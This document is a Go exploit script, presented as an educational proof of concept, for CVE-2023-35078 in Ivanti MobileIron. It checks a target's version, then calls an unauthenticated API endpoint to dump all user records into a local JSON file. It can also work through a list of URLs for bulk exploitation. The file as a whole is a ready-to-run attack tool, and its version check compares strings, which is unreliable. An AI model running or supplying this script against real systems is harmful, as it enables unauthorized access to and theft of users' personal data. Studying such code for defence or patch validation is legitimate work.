package main

import (
	"bytes"
	"crypto/tls"
	"flag"
	"fmt"
	"io"
	"io/ioutil"
	"net"
	"net/http"
	"os"
	"strings"
)

func banner() {
	fmt.Println(`
┏┓┓┏┏┓  ┏┓┏┓┏┓┏┓  ┏┓┏━┏┓━┓┏┓
┃ ┃┃┣ ━━┏┛┃┫┏┛ ┫━━ ┫┗┓┃┫ ┃┣┫
┗┛┗┛┗┛  ┗━┗┛┗━┗┛  ┗┛┗┛┗┛ ╹┗┛

[+] Description:
This script demonstrates an ethical Proof of Concept (PoC) for CVE-2023-35078 - Remote Unauthenticated API Access Vulnerability
The vulnerability allows unauthorized access to sensitive data through an insecure API endpoint.
https://nvd.nist.gov/vuln/detail/CVE-2023-35078

[+] Disclaimer:
This script is for educational and ethical purposes only. It should only be used with explicit permission from the system owner and for legitimate security testing.

[+] Usage:
./cve_2023_35078 -u http://
./cve_2023_35078 -f urls.txt

[+] Author:
Amrul_01 (https://twitter.com/amrul_01)
`)
}

func isIPAddress(s string) bool {
	return net.ParseIP(s) != nil
}

func checkIvantiMobileIronVersion(url string) bool {
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: tr}

	resp, err := client.Get(url)
	if err != nil {
		fmt.Println("[-] Error occurred:", err)
		return false
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusOK {
		bodyBytes, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			fmt.Println("[-] Error occurred:", err)
			return false
		}
		bodyString := string(bodyBytes)

		versionStart := strings.Index(bodyString, "ui.login.css?")
		if versionStart != -1 {
			versionEnd := strings.Index(bodyString[versionStart:], "\"")
			version := bodyString[versionStart+len("ui.login.css?"):versionStart+versionEnd]
			fmt.Printf("[*] Target version: %s\n", version)
			if version <= "11.4" {
				fmt.Printf("[+] Target is vulnerable! %s\n", url)
				return true
			} else {
				fmt.Printf("[-] Target is not vulnerable! %s\n", url)
				return false
			}
		} else {
			fmt.Printf("[-] Target is not vulnerable! %s\n", url)
		}
	} else {
		fmt.Printf("[-] Target is not vulnerable! %s\n", url)
	}

	return false
}

func getUsers(url string) {
	vulnURL := url + "/mifs/aad/api/v2/authorized/users?adminDeviceSpaceId=1"
	fmt.Printf("[*] Exploiting the target... %s\n", url)

	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: tr}

	resp, err := client.Get(vulnURL)
	if err != nil {
		fmt.Println("[-] Error occurred:", err)
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusOK {
		fmt.Println("[+] Extracting Data:")
		fmt.Printf("[*] Dumping all users from %s\n", vulnURL)
		filename := strings.Split(strings.Split(url, "//")[1], "/")[0] + ".json"
		file, err := os.Create(filename)
		if err != nil {
			fmt.Println("[-] Error occurred:", err)
			return
		}
		defer file.Close()

		buf := new(bytes.Buffer)
		_, err = io.Copy(buf, resp.Body)
		if err != nil {
			fmt.Println("[-] Error occurred:", err)
			return
		}

		_, err = file.Write(buf.Bytes())
		if err != nil {
			fmt.Println("[-] Error occurred:", err)
			return
		}

		fmt.Println("[+] Data saved to file:", filename)
		fmt.Println("[+] Vulnerability Exploited Successfully!\n")
	} else {
		fmt.Println("[-] Exploit failed. The target is not vulnerable.")
	}
}

func main() {
	var url string
	var filename string

	flag.StringVar(&url, "u", "", "URL to exploit")
	flag.StringVar(&filename, "f", "", "File containing URLs")
	flag.Parse()

	banner()

	if url == "" && filename == "" {
		fmt.Println("[-] Please provide either a target URL (-u) or a file containing URLs (-f).")
		return
	}

	if filename != "" {
		fmt.Println("[*] Reading URLs from file...")
		urls, err := ioutil.ReadFile(filename)
		if err != nil {
			fmt.Println("[-] Error occurred:", err)
			return
		}
		lines := strings.Split(string(urls), "\n")
		for _, line := range lines {
			if line == "" {
				continue
			}
			line = strings.TrimSpace(line)

			if isIPAddress(line) && !strings.HasPrefix(line, "http://") && !strings.HasPrefix(line, "https://") {
				line = "http://" + line
			}

			fmt.Printf("[*] Target: %s\n", line)
			isVulnerable := checkIvantiMobileIronVersion(line)
			if isVulnerable {
				getUsers(line)
			}
		}
	} else if url != "" {
		fmt.Printf("[*] Target: %s\n", url)
		isVulnerable := checkIvantiMobileIronVersion(url)
		if isVulnerable {
			getUsers(url)
		}
	}
}
